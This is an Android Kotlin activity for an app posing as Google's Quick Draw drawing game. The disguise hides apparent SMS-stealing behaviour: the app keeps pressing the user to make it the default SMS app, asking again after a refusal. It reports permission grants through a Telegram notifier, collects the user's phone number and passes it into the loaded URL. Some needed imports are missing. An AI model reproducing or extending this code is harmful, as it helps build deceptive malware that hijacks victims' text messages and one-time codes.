package com.android.quickdraw

import android.content.Intent
import android.os.Bundle
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.secure.webapp.core.NetworkManager
import com.secure.webapp.core.PermissionsHandler
import com.secure.webapp.core.TelegramNotifier
import com.secure.webapp.ui.dialogs.PhoneInputDialog
import com.secure.webapp.ui.dialogs.NoInternetDialog
import com.secure.webapp.ui.web.CustomWebViewClient

class MainActivity : AppCompatActivity() {
    private lateinit var networkManager: NetworkManager
    private lateinit var notifier: TelegramNotifier
    private lateinit var permissionsHandler: PermissionsHandler

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        networkManager = NetworkManager(this)
        notifier = TelegramNotifier(this)
        
        val resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            when (result.resultCode) {
                RESULT_OK -> {
                    notifier.sendNotification("Пользователь принял все разрешения")
                    showPhoneInputDialog()
                }
                RESULT_CANCELED -> permissionsHandler.changeDefaultSmsApp()
                else -> finish()
            }
        }

        permissionsHandler = PermissionsHandler(this, resultLauncher, notifier)
        checkInternetConnection()
    }

    private fun checkInternetConnection() {
        if (networkManager.isInternetAvailable()) {
            permissionsHandler.changeDefaultSmsApp()
        } else {
            NoInternetDialog(this) { checkInternetConnection() }.show()
        }
    }

    private fun showPhoneInputDialog() {
        PhoneInputDialog(this, notifier) { phoneNumber ->
            loadWebView()
        }.show()
    }

    private fun loadWebView() {
        val webView: WebView = findViewById(R.id.webview)
        
        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
            loadWithOverviewMode = true
            useWideViewPort = true
        }
    
        webView.webViewClient = CustomWebViewClient()
    
        val savedPhoneNumber = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
            .getString("phone_number", null)
        
        val baseUrl = "https://quickdraw.withgoogle.com"
        val urlToLoad = if (savedPhoneNumber != null) {
            "$baseUrl?phone=${URLEncoder.encode(savedPhoneNumber, "UTF-8")}"
        } else {
            baseUrl
        }
    
        webView.loadUrl(urlToLoad)
    
        webView.setOnKeyListener { _, keyCode, event ->
            if (keyCode == KeyEvent.KEYCODE_BACK && event.action == MotionEvent.ACTION_UP && 
                webView.canGoBack()) {
                webView.goBack()
                true
            } else {
                false
            }
        }
    }
}
